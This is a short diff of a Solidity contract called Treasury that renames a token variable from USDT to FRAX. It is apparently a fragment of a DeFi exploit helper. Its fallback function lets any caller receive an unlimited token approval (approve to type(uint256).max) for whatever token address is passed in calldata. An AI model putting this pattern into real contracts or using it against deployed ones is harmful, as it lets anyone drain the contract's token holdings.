@@ -9,14 +9,14 @@ pragma solidity 0.8.20;
 */
 contract Treasury {
     bool public LOCKED;
-    address public USDT;
+    address public FRAX;
     address public COME2TOP;
 
     fallback() external {
         COME2TOP = msg.sender;
-        USDT = abi.decode(msg.data, (address));
+        FRAX = abi.decode(msg.data, (address));
 
-        (bool OK, ) = USDT.call(
+        (bool OK, ) = FRAX.call(
             abi.encodeWithSelector(0x095ea7b3, COME2TOP, type(uint256).max)
         );
 
